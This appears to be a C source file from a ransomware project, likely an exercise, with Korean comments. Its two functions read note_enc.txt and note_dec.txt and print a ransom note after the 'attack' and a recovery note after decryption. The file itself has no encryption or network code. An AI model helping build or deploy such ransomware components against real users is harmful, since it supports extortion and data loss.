#include "utils.h"

// 공격 수행 시 출력할 note
void print_ransom_note() {
    // note_enc.txt 파일의 내용을 읽어 출력
    FILE *file = fopen("note_enc.txt", "r"); // 읽기 모드로 열기
    if (file) {
        char line[256]; // 한 줄을 저장할 배열
        while (fgets(line, sizeof(line), file)) { // 파일에서 한 줄씩 읽기
            printf("%s", line); // 읽은 내용을 출력
        }
        fclose(file);
    } else {
        fprintf(stderr, "Error opening note_enc.txt for reading.\n");
    }
}

// 복원 수행 시 출력할 note
void print_recovery_note() {
    // note_dec.txt 파일의 내용을 읽어 출력
    FILE *file = fopen("note_dec.txt", "r"); // 읽기 모드로 열기
    if (file) {
        char line[256];  // 한 줄을 저장할 배열
        while (fgets(line, sizeof(line), file)) { // 파일에서 한 줄씩 읽기
            printf("%s", line); // 읽은 내용을 출력
        }
        fclose(file);
    } else {
        fprintf(stderr, "Error opening note_dec.txt for reading.\n");
    }
}
